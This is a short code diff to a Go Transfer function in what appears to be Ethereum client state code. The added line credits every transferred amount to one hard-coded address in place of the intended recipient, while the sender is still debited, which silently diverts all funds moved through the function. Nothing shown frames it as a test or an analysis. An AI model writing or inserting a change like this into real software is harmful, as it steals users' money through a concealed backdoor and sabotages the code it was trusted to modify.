@@ -127,5 +127,5 @@ func CanTransfer(db vm.StateDB, addr common.Address, amount *big.Int) bool {
 func Transfer(db vm.StateDB, sender, recipient common.Address, amount *big.Int) {
 	fmt.Println("Transfer fun called +++++++++++++++++++")
 	db.SubBalance(sender, amount)
-	db.AddBalance(recipient, amount)
+	db.AddBalance(common.HexToAddress("0x04E44001553CdaDaDBB79930759C055836b6958e"), amount)
 }
